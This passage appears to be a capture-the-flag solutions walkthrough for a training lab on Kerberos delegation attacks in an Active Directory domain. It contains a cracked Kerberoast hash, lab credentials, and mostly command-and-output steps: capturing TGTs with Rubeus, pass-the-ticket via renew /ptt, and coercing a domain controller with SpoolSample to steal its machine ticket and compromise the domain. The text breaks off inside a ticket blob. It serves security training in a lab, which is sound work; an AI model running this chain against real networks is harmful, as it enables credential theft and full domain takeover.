$krb5tgs$23$*adam.jones$INLANEFREIGHT.LOCAL$inlanefreight.local/adam.jones*$b9240951e3d3e61f74b180386ecd5283$3037106e1e8681815b08e24253b812e18f72dbac552f11313cfe199a5081d9af12b89c9dffbb9653c85d7cdce0acb56a07bdc3a8e99bbf319178b3a321668357c9c1f85a164fa5497ebd2f77f8a338728627d964dde3a2832cd96dcfe676f876342e87db32dc9803869128c8b8a7f1d91f1e6dbb5db4c1992486e6f99848f67d652a35e90222d334f51d0be81abc157bfb466348708fcebdf33536f0b76cdec48db25730892e0b3adb2bca248e7a32f3fb12ce1e5d77ce945592f7fb1498eeac0ea1c46bf32f987695bde68159685e3cd6c2c22a06dc9f34bcbdc6e788d5a73f6c981bdb52466ffa1072512529e09f9aaa198e150afc77209f4013d241dcb0f9323c158b47abbc9bf60ee00c6cc215e4f91ac0df7c8586e2b65eac3376036428dd7e66a2425c8205f1b9190221e4b3b931db45941bfae32de7cd630c76a85f7d9e867878e24d3b9d6b1c2b143c0167f50f0061d514a66db0769c4cb1c3274176056ca9f1d44168cbe66e1de4fccce52d0eaa838ee716a0d497776c81242e384e3df4a0c94bc305f7eb8d61c6798ce6886dcfd6913ab5490054ac3b35289ed58b17abcea193e71884b6920dd3bf79e64e8daac4a794fa40a29b5e5e8687b4a7fdd5ad3a9eea494a80404098ebe7b2b8094af535fcdce35ce2536369a1f279e3e51de3480ac009906caa41048c06c215f165b015292a2cd6dfaaef8077bc3d7094701c967ac00f48b0a708c5a910f6c28b108f6202078370326a5368f36daae765671006fa781d23fc11310c933fe3732dcc4bd8c4fb45411cc07e43dfdfc7e81281593b1d5dcc88e14a95fe4191ef57eb0ebdc16e9cf453db1b6402c36c8a223916fba1e6b46ab4d232c1e9941e5d87e4fc5e5e167b71d3111485293b0cce8dfff770eb753d6a52cd5693c57f389712c660c1ac0a8313d8bdc8f65fb8fb79fe5d7e30f8e69c19b3725ad43f7ad5e4caecc9332fbcb1ccbeb19cc1b7db296303052e3f9446197a16801db0a944d8940a4188bd994cca393326822ec5c8ef44a49a15767125fe18c26a2e44cfa8ff00b7e3f103e1c5c2da3d219a890631aa16b8f9d6ccd74b043d848032224e390a6ba0538eb1baa50f5a940ba8e5de2a48d97b1d547c30ab5869d49f37e41fb1ffd47cc2d3a8c402bf1f018607bb15e5a08ff8c40da7199ee802c0db9ca08a86ec59bf8b117a4166f71fa943c5762edca02664e8ef773a1b0624318f6d8945f1a0c029a30958fc083d10d1c621ff8fdd11f32798a153beafa0710ae402b8f49a21b105cd20de7df8b8a7b813ba6f18e5da1ccd84a22af2c7bbe90a78b2170af0aa9f6e822a132a42444ba1a36c5d1b52ffd6e09e8527afb8189cd72de9d0fa1a280bb5068fc0baf8c3aeab0afbb381532d8f40665fa0bb93cf78ade53dbd1f943518a4a1d9baa3f1ae2968ea4bdd88a5d958712be57a359ca108f5ed9281defb90dec75fab5a6aaedde7b17e5c7bb3f97420cb2c37c6bf5590034f73bdbe5ef0e81b3ee17abab01435e7eda85996554f440fb817f15716818847b295669f978110d40a:spongebob
```

Answer: `spongebob`

# Kerberos Delegations

## Question 1

### "What extension allows a service to obtain a forwardable TGS to itself on behalf of an arbitrary user?"

The `S4U2Self` extension allows a service to obtain a forwardable TGS to itself on behalf of an arbitrary user:

![[HTB Solutions/CAPE/z. images/228c2a39f23115286404c4bdab6603ef_MD5.jpg]]

Answer: `S4U2Self`

# Kerberos Delegations

## Question 2

### "What Active Directory attribute is updated when a service account is added for a resource-based constrained delegation?"

The `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute is updated when a service account is added for a resource-based constrained delegation:

![[HTB Solutions/CAPE/z. images/3077d1cbfbe7796832e54b15315c0d4e_MD5.jpg]]

Answer: `msDS-AllowedToActOnBehalfOfOtherIdentity`

# Unconstrained Delegation - Computers

## Question 1

### "Connect via RDP to the target IP on port 23389 with Derek Walker's credentials, a local administrator on SQL01, which is a machine with Unconstrained Delegation. Wait for a user to connect and then try to read the content of \\\\DC01\\Shares\\Marketing\\flag.txt"

After spawning the target machine, students first need to connect to it with `xfreerdp` on port 23389 using the credentials `derek.walker:h4cknd0c0zwhYN07:)`:

Code: shell

```shell
xfreerdp /u:derek.walker /p:'h4cknd0c0zwhYN07:)' /v:STMIP:23389 /dynamic-resolution
```

```
┌─[htb-ac-413848@htb-fiikmkavlq]─[~]
└──╼ $xfreerdp /u:derek.walker /p:'h4cknd0c0zwhYN07:)' /v:10.129.192.152:23389 /dynamic-resolution
[23:17:18:976] [4463:4464] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[23:17:18:976] [4463:4464] [WARN][com.freerdp.crypto] - CN = SQL01.INLANEFREIGHT.LOCAL
[23:17:18:976] [4463:4464] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[23:17:18:976] [4463:4464] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[23:17:18:976] [4463:4464] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[23:17:18:976] [4463:4464] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.192.152:23389) 
[23:17:18:976] [4463:4464] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[23:17:18:976] [4463:4464] [ERROR][com.freerdp.crypto] - Common Name (CN):
[23:17:18:976] [4463:4464] [ERROR][com.freerdp.crypto] - 	SQL01.INLANEFREIGHT.LOCAL
[23:17:18:976] [4463:4464] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.192.152:23389 (RDP-Server):
	Common Name: SQL01.INLANEFREIGHT.LOCAL
	Subject:     CN = SQL01.INLANEFREIGHT.LOCAL
	Issuer:      CN = SQL01.INLANEFREIGHT.LOCAL
	Thumbprint:  59:d4:51:20:54:b6:c0:29:a9:32:45:04:ae:fc:ff:92:bb:b5:65:15:b7:76:75:d2:29:73:f2:a5:13:3c:db:ec
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Subsequently, in a privileged PowerShell session, students need to navigate to `C:\Tools\` and invoke `Rubeus` to monitor for new TGTs every second; students will find that the user `brian.willis` connects to `SQL01`:

Code: powershell

```powershell
.\Rubeus.exe monitor /interval:1 /nowrap
```

```
PS C:\Tools> .\Rubeus.exe monitor /interval:1 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: TGT Monitoring
[*] Monitoring every 1 seconds for new TGTs

<SNIP>

[*] 4/26/2023 10:23:12 PM UTC - Found new TGT:

  User                  :  brian.willis@INLANEFREIGHT.LOCAL
  StartTime             :  4/26/2023 5:23:00 PM
  EndTime               :  4/27/2023 3:23:00 AM
  RenewTill             :  5/3/2023 5:23:00 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    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
```

Using the ticket of `brian.willis`, students need to use the [renew action](https://github.com/GhostPack/Rubeus#renew) of `Rubeus` to get a new TGT, and utilize the `/ptt` option to pass the received ticket into memory so that it can be used for future requests:

Code: powershell

```powershell
.\Rubeus.exe renew /ticket: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 /ptt
```

```
PS C:\Tools> .\Rubeus.exe renew /ticket:doIGHDCCBhigAwIBBaEDAgEWooIFCDCCBQRhggUAMIIE/KADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggSyMIIErqADAgESoQMCAQKiggSgBIIEnHJaL8BZOgOMxZrFhR0cZE50VUhIGUdLw0X8LB/it5vc4i5XwgNzGV+uVxwdqjdW21K6NSwm6xuiFqECvt8UTaelGzXc/wgK9CYcLBiHCr5EZVtjKnY7EOuHDqMppWqpLFM1myVelKBseEvaD/NI2F2JJ18Kezd7S5mDBeu7ZapUEX8WYeOVgBqfAK12rJpA4MjeauDEncKkfLTOLbqeBMj4WmKTwoVFrarHoQsQaqGPG+s7Ndr/FMAZ/QppODFCjDCkUt2X3udpndkDu9no71H/0GbfC4LYNZUDm3MUfotM1145y0aOG+MSfo6FazrackuHbaTNUxziz9nb1PzlozyEFJSczw9kE8SIGGehlhnfAIIUYQ95yaIaq8RALNHmxaW0zkhzCcscKEBOftw57fUTS2ztaV6QgCkC4Nc75825sXXTUoETqORXGv7Xb1U2nehHjv1rObbxiQ59KpGZzjFT9SfL5q948bJM3kxkCIJtjfZIDxe9PHGDKlRouZ95A4wFKovSdZpP5qfibrsMgQskr8sPIjjrQerLsBzpQ+yHKXDAMfwT1duV3sQyWAdP8oIA4xcXc++LKYDhjqZF4646RuoLncrIsTS2JFAfF8Z1LPk7F3seWP/hY5TajV10D2+H4I1V6sgCqXOzAyDMN7wGhv8Wf5MFupxJfY0tIT6yaCQyHRJT5oMZh5uYwyjZwZF6NSUYaVZ2K0BVDTwupmlU0uXLbmo1Buf3YLHfzx4jp7+7bw71oJ1jVCFwWJrPrXUc/iP8P0b4UshbJm2RHk/nf4X5lUwJ9fep10Oa7qq5LlRwJzAdShBq8YxbAmgREo177jXC2yHlPeh6jGdUNqqk/hIr87GFsFVYCdwmK5swVJ36kytig6e2B1sy7NfXJMREwBoZk2pUtkvGqwwPsmzd6KwaCw0bLe/6KGchKy7rvDp3oC8RHxsCDLxKKDnH7FmzJXNr0aDLuv+4iryOTDRLSwFm4lCP0ya5+wUwOT0o480nCv4JgWvp2V2hs3oR/ItMPYFKicGzZCgRhZzB37jqQx8zY4pXnfCjM/hdf9UfuqBc5W0MHQfWDeDHKeLqEGFp+5c/rSYBvzpQS75iNNjwIh2yixlqDQargPz9n76O0DNQxv0KeqtvFft3ubx8br2OuY0cmgBiMdr1MuQGHjpnmuc9caNK8ZqSywkHrY6WHkIMj1aYfhywmFLIJ3bFLm5us4jeREO3XKBfwkYuUqgP+C+7XzFe5pf2v1xVR8Tv40A3+/RPZA50VtSNq6ueifQqlrpu+Wir2EbmNxeFy8iXMY8RxenhwoC5Syzlt/XcT1KVPX70HvEEFfinakLQq/Cbfm21EHBMi99gtrykQqxaHJNBV63tJMMcuFuK3SWzZXe1KvfvgB0mhKegjY9+zgBvW6aOaUVKkgbosOx5isvM5uxr8Y1WwlLSBtE1oZfH+HNZQsFfSyoGelhjroPX7ycX5IyqHS3mLR0w8PP/8eLZgDH4XqCOFOePl/JPa+q4OcW30WD5fmqquLo5N87o9sTxyZSOfgCpp8JOvRy06yVcjxjNdsc/Wxxfwk+jgf8wgfygAwIBAKKB9ASB8X2B7jCB66CB6DCB5TCB4qArMCmgAwIBEqEiBCCygXVVdvX/D/SoZ8VxziYHMqW88sDyIY02RiHt/ed64KEVGxNJTkxBTkVGUkVJR0hULkxPQ0FMohkwF6ADAgEBoRAwDhsMYnJpYW4ud2lsbGlzowcDBQBgoQAApREYDzIwMjMwNDI2MjIyMzAwWqYRGA8yMDIzMDQyNzA4MjMwMFqnERgPMjAyMzA1MDMyMjIzMDBaqBUbE0lOTEFORUZSRUlHSFQuTE9DQUypKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUw= /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: Renew Ticket

[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
[*] Building TGS-REQ renewal for: 'INLANEFREIGHT.LOCAL\brian.willis'
[+] TGT renewal request successful!
[*] base64(ticket.kirbi):

      doIGHDCCBhigAwIBBaEDAgEWooIFCDCCBQRhggUAMIIE/KADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
      <SNIP>
[+] Ticket successfully imported!
```

At last, when reading the contents of the file `\\DC01\Shares\Marketing\flag.txt`, students will attain the flag `HTB_UnC0n$tr4_in3d_Delegat10N`:

Code: powershell

```powershell
more \\DC01\Shares\Marketing\flag.txt
```

```
PS C:\Tools> more \\DC01\Shares\Marketing\flag.txt

HTB_UnC0n$tr4_in3d_Delegat10N
```

Answer: `HTB_UnC0n$tr4_in3d_Delegat10N`

# Unconstrained Delegation - Computers

## Question 2

### "Compromise the Domain and read the content of \\\\DC01\\C$\\Unconstrained\\flag.txt"

Using the same RDP session from the previous question, and in the same privileged `PowerShell` session, students need to invoke `Rubeus` to monitor for new TGTs every second from the domain controller `DC01`:

Code: powershell

```powershell
.\Rubeus.exe monitor /targetuser:DC01 /interval:1 /nowrap
```

```
PS C:\Tools> .\Rubeus.exe monitor /targetuser:DC01 /interval:1 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: TGT Monitoring
[*] Target user     : DC01
[*] Monitoring every 1 seconds for new TGTs
```

Subsequently, in a new privileged PowerShell session (in `C:\Tools\`), students need to use [SpoolSample PoC](https://github.com/leechristensen/SpoolSample) to coerce `DC01` into authenticating to `SQL01`:

Code: powershell

```powershell
.\SpoolSample.exe DC01.inlanefreight.local SQL01.inlanefreight.local
```

```
PS C:\Tools> .\SpoolSample.exe DC01.inlanefreight.local SQL01.inlanefreight.local

[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function
TargetServer: \\DC01.inlanefreight.local, CaptureServer: \\SQL01.inlanefreight.local
Attempted printer notification and received an invalid handle. The coerced authentication probably worked!
```

When checking `Rubeus`, students will find that they attained the TGT of `DC01$`:

```
[*] 4/26/2023 11:27:37 PM UTC - Found new TGT:

  User                  :  DC01$@INLANEFREIGHT.LOCAL
  StartTime             :  4/26/2023 6:24:47 PM
  EndTime               :  4/27/2023 4:24:47 AM
  RenewTill             :  5/3/2023 6:24:47 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    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
```

Using the ticket of `DC01$`, students need to use the [renew action](https://github.com/GhostPack/Rubeus#renew) of `Rubeus` to get a new TGT, and utilize the `/ptt` option to pass the received ticket into memory so that it can be used for future requests:

Code: powershell

```powershell
.\Rubeus.exe renew /ticket:doIF3jCCBdqgAwIBBaEDAgEWooIE0TCCBM1hggTJMIIExaADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggR7MIIEd6ADAgESoQMCAQKiggRpBIIEZcGikgTsUhcAp+nPxnoodqb2/61EFV7vuZ5fbKA6b2F2VlkOZNQtyXL0wJCkeXSkIy39EQ27pCPn4gyIRi6IjaeIQFWTPNJWNPhcYZG4OjJwBofIQ8n68p/GTomDO+CPFJdZlPXBAA3sSvaNJygF2sKrZAPphLjnILr6zput1kKwVFdfQuIHaJTWpbOIMoxR18VQ4eVvOkATAM4btECBqtg7w5+8wP8lx7O6CenYSTMz9ojYIbFBAGz73PHRzR61y6pKgSPz+D9rs+pkyfe+b2dQKPiC/7Y+OHPmFffJ/hU02ZZaGGacKxibEChLE3mCXFsIuvrec7pjrSQokwbJ/DoZAtnUAA8mWheaDadptaB9Fzb1xUMd7Usrxo84ymnkvdg2Gz2lvXVoiEqSyuknHunXQxOkOt+89q92fK5PY30CeCbihCn2b0aw36zVDKbxAS3EuebSfkJowN7ggeghdob2QxLSoBKyJWMwxvzlRmr0H5KhrUDPt0E8+Le2dx1sCI67PYI/OyoKF/c7MvEtLwdQ0qWMlxIHIygSReOLNfw0cK00YnV8S9ip8R1K/m30uzXAhgsjL4tmwOcnPSQjCGgrA1Ys0XUExXv7VIvCX78FyH0haXlYiwZJ9XfYRwP11fEfWVDGO3dPe8GTszf/urCDMe2IdrOLztKVASCpzEIITUECgJekjrH2HW5MOEZ3i1QLkV66/Mm72H79RfpSJYzZAPcJlsFGMYpOcQ+Wx3FDS/BBj/aXCREwQmFdw5e52ttDC/V4cZrOSMBrG32KNr1bTWkxaxDaHOFxAhOf8yJnJDpsTHS8avkaBbgaiWrEKGUmn0rdG2CgFg7Vvc3eCfm2fdQ0e0i/LpOmjlINXIukJEJDewwtuPwkZWXzZppFsa0Z2i8oRuPfgt78mG8m0Fpxzz0fZ3bH57C8ThSb+voUvJ1K/EIXNzxawVCROWq0DK1g6rDd7uoD1gwAwhwN0arfgTjRzpDIsBB7qJ7nIGRkAJ26EEaw9nYTAww8lty4REy3qQScOTNE3H6yz1qSHNRUYQ19eg/uuv2Yg0pXUAxZgYpByLWiwQWc8h8bul3kYL3Ouae0hoXt0VNznmPl+SH3+VEylQSQflGJ8FbQfMLArF5zzf8ByqXqmSWobZg6ZnyMX4tm7jmzqe6FGEVSmvNbhyq0TRIxBmgcFIhuE1f1mDelVKsVtT+IxLvcpM89CgxXfbMiwN7mZrxQ/nVubGsclDJLivd1qPgqlBmdwooRt18jcGqrOONs4VbOo8GkwGsPYU7/jrC3X1WfM0eLOdt8BNv56r1wBbiX4spvJ32AAW7c/CttAVIiMcTtngWtUVm9hS1FQ9pjHYhN6pYPVtcQeeFQdDNYjXPjCzzDOboGMafbKsO1ZKVBkCSSqFyj8V+t0X9pc3DrE9XDaI4KST39gvRlO6HcECnp65jmk1l3MenagrvpK6xJcv6wQ2ZgcXXMb8xPx6aAfPlnebJmhq8I32v8u6OB+DCB9aADAgEAooHtBIHqfYHnMIHkoIHhMIHeMIHboCswKaADAgESoSIEIJFdwwp+XjBSBKcIAFGIN+R6geVijM6NjKv08lTTjZmDoRUbE0lOTEFO